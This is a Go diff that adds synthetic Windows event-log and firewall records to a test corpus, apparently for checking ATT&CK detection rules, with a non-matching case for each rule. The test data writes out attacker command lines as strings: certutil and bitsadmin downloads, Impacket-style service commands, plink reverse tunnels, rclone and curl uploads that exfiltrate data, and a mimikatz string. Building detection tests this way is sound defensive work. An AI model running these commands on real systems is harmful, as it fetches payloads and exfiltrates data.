@@ -185,8 +185,81 @@ func buildCorpus() []model.Event {
 	e.Raw = "<Event><Data>privilege::debug sekurlsa::logonpasswords</Data></Event>"
 	e = c.add(sec, 4688, "pc01", time.Hour, 0, map[string]string{"CommandLine": "y.exe"})
 	e.Message = "Uruchomiono MimiKatz"
+	c.tactics()
 	c.network()
 	return c.events
+}
+
+// tactics dodaje zdarzenia reguł taktyk ATT&CK (rozpoznanie, przemieszczanie,
+// zbieranie, C2, wynoszenie) – każde z przypadkiem granicznym, który nie
+// powinien trafić.
+func (c *corpus) tactics() {
+	sec, sys := "Security", "System"
+	sysmon, ps := "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-PowerShell/Operational"
+	at := 9*time.Hour + 30*time.Minute
+	proc := func(host string, ch string, code uint32, d time.Duration, img, cmd, parent string) {
+		f := map[string]string{"CommandLine": cmd}
+		if code == 1 {
+			f["Image"], f["ParentImage"] = img, parent
+		} else {
+			f["NewProcessName"], f["ParentProcessName"] = img, parent
+		}
+		c.add(ch, code, host, at+d, 0, f)
+	}
+	sys32 := `C:\Windows\System32\`
+	// Seria rozpoznania: 4 różne narzędzia na pc05 w 5 min; pc06 – tylko 3.
+	for i, tool := range []string{"whoami.exe", "ipconfig.exe", "systeminfo.exe", "net.exe"} {
+		proc("pc05", sysmon, 1, time.Duration(i)*time.Minute, sys32+tool, tool+" /all", sys32+"cmd.exe")
+	}
+	for i, tool := range []string{"whoami.exe", "ipconfig.exe", "whoami.exe", "tasklist.exe"} {
+		proc("pc06", sec, 4688, time.Duration(i)*time.Minute, sys32+tool, tool, sys32+"cmd.exe")
+	}
+	// Rozpoznanie AD: nltest /domain_trusts, net group "domain admins", AdFind; nltest /sc_query – nie.
+	proc("pc05", sec, 4688, 6*time.Minute, sys32+"nltest.exe", "nltest /domain_trusts /all_trusts", sys32+"cmd.exe")
+	proc("pc05", sysmon, 1, 7*time.Minute, sys32+"net.exe", `net group "Domain Admins" /domain`, sys32+"cmd.exe")
+	proc("pc07", sysmon, 1, 7*time.Minute, `C:\Users\Public\AdFind.exe`, `AdFind.exe -f objectcategory=computer`, sys32+"cmd.exe")
+	proc("pc07", sysmon, 1, 8*time.Minute, sys32+"nltest.exe", "nltest /sc_query:LAB", sys32+"cmd.exe")
+	// Zdalne wykonanie przez usługę: PsExec, Impacket; zwykła usługa – nie.
+	c.add(sys, 7045, "srv02", at, 0, map[string]string{"ServiceName": "PSEXESVC", "ImagePath": `%SystemRoot%\PSEXESVC.exe`})
+	c.add(sys, 7045, "srv02", at, 0, map[string]string{"ServiceName": "BTOBTO",
+		"ImagePath": `%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat`})
+	c.add(sys, 7045, "srv02", at, 0, map[string]string{"ServiceName": "Spooler2", "ImagePath": `C:\Windows\System32\spoolsv.exe`})
+	// WMI/WinRM: powłoka z wmiprvse i wsmprovhost; notatnik z wmiprvse – nie.
+	proc("srv02", sysmon, 1, time.Minute, sys32+"cmd.exe", `cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1791 2>&1`,
+		sys32+`wbem\WmiPrvSE.exe`)
+	proc("srv03", sec, 4688, time.Minute, sys32+`WindowsPowerShell\v1.0\powershell.exe`, "powershell -c Get-Process",
+		sys32+"wsmprovhost.exe")
+	proc("srv02", sysmon, 1, 2*time.Minute, sys32+"notepad.exe", "notepad.exe", sys32+`wbem\WmiPrvSE.exe`)
+	// Logowania NTLM jednego konta na 5 komputerach; konto komputera i Kerberos – nie.
+	for i := range 5 {
+		h := fmt.Sprintf("ws%02d", i)
+		c.add(sec, 4624, h, at+time.Duration(i)*time.Minute, 0, map[string]string{"TargetUserName": "svc-x", "TargetDomainName": "LAB",
+			"LogonType": "3", "AuthenticationPackageName": "NTLM", "IpAddress": "10.0.0.66"})
+		c.add(sec, 4624, h, at+time.Duration(i)*time.Minute, 0, map[string]string{"TargetUserName": "PC66$", "TargetDomainName": "LAB",
+			"LogonType": "3", "AuthenticationPackageName": "NTLM", "IpAddress": "10.0.0.66"})
+		c.add(sec, 4624, h, at+time.Duration(i)*time.Minute, 0, map[string]string{"TargetUserName": "ewa.k", "TargetDomainName": "LAB",
+			"LogonType": "3", "AuthenticationPackageName": "Kerberos", "IpAddress": "10.0.0.67"})
+	}
+	// Zbieranie: zrzut ekranu w PowerShell; zwykły skrypt – nie.
+	c.add(ps, 4104, "pc08", at, 0, map[string]string{"ScriptBlockText": "$g=[Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size)"})
+	c.add(ps, 4104, "pc08", at, 0, map[string]string{"ScriptBlockText": "Get-ChildItem C:\\Raporty | Sort-Object Length"})
+	// Archiwum z hasłem; bez hasła i rozpakowanie z hasłem – nie.
+	z := `C:\Program Files\7-Zip\7z.exe`
+	proc("pc08", sysmon, 1, time.Minute, z, `7z.exe a -pTajne123 -mhe=on C:\Users\Public\d.7z C:\Dane`, sys32+"cmd.exe")
+	proc("pc08", sysmon, 1, time.Minute, z, `7z.exe a C:\Kopie\k.7z C:\Dane`, sys32+"cmd.exe")
+	proc("pc08", sysmon, 1, time.Minute, z, `7z.exe x -pTajne123 C:\Users\Public\d.7z`, sys32+"cmd.exe")
+	// Pobieranie narzędziem systemowym; certutil -hashfile – nie.
+	proc("pc09", sec, 4688, 0, sys32+"certutil.exe", "certutil -urlcache -split -f http://203.0.113.5/a.exe a.exe", sys32+"cmd.exe")
+	proc("pc09", sysmon, 1, 0, sys32+"bitsadmin.exe", "bitsadmin /transfer j http://203.0.113.5/b.exe C:\\b.exe", sys32+"cmd.exe")
+	proc("pc09", sec, 4688, 0, sys32+"certutil.exe", "certutil -hashfile a.exe SHA256", sys32+"cmd.exe")
+	// Zdalny dostęp i tunele; plink bez -R – nie.
+	proc("pc09", sysmon, 1, time.Minute, `C:\Users\jan\Downloads\AnyDesk.exe`, "AnyDesk.exe", `C:\Windows\explorer.exe`)
+	proc("pc09", sysmon, 1, time.Minute, `C:\Tools\plink.exe`, "plink.exe -R 8080:127.0.0.1:3389 x@203.0.113.6", sys32+"cmd.exe")
+	proc("pc09", sysmon, 1, time.Minute, `C:\Tools\plink.exe`, "plink.exe x@192.168.88.10", sys32+"cmd.exe")
+	// Wynoszenie do chmury; rclone version – nie.
+	proc("pc10", sysmon, 1, 0, `C:\Users\Public\rclone.exe`, `rclone.exe copy C:\Dane mega:kopia --transfers 8`, sys32+"cmd.exe")
+	proc("pc10", sec, 4688, 0, sys32+"curl.exe", "curl.exe -T C:\\Dane\\a.zip https://transfer.example/a.zip", sys32+"cmd.exe")
+	proc("pc10", sysmon, 1, 0, `C:\Users\Public\rclone.exe`, "rclone.exe version", sys32+"cmd.exe")
 }
 
 // network dodaje zdarzenia urządzeń sieciowych przez prawdziwe dekodery
@@ -263,6 +336,20 @@ func (c *corpus) network() {
 	for i, u := range []string{"a1x", "a2x", "a3x", "a4x"} {
 		ts := compatT0.Add(9*time.Hour + time.Duration(i)*time.Minute)
 		add(9*time.Hour+time.Duration(i)*time.Minute, 0, fmt.Sprintf(entra, 10+i, ts.Format(time.RFC3339), u, "198.51.100.51"))
+	}
+	// FortiGate: skanowanie portów (22 porty z jednego adresu w 66 s) i
+	// przeszukiwanie sieci (32 adresy na jednym porcie); przepuszczony ruch – nie.
+	traffic := `<189>date={date} time={time} devname="FGT-HQ" tz="+0200" logid="0000000013" type="traffic" subtype="forward" ` +
+		`srcip=%s srcport=40000 dstip=%s dstport=%d proto=6 action="%s" policyid=0 service="tcp/%d"`
+	for i := range 22 {
+		add(9*time.Hour+40*time.Minute+time.Duration(i)*3*time.Second, 0, fmt.Sprintf(traffic, "203.0.113.77", "192.0.2.10", 20+i, "deny", 20+i))
+	}
+	for i := range 32 {
+		add(9*time.Hour+45*time.Minute+time.Duration(i)*3*time.Second, 0,
+			fmt.Sprintf(traffic, "10.10.10.66", fmt.Sprintf("10.10.20.%d", i+1), 445, "deny", 445))
+	}
+	for i := range 25 {
+		add(9*time.Hour+50*time.Minute+time.Duration(i)*time.Second, 0, fmt.Sprintf(traffic, "192.168.1.10", "8.8.8.8", 1000+i, "accept", 1000+i))
 	}
 }
 
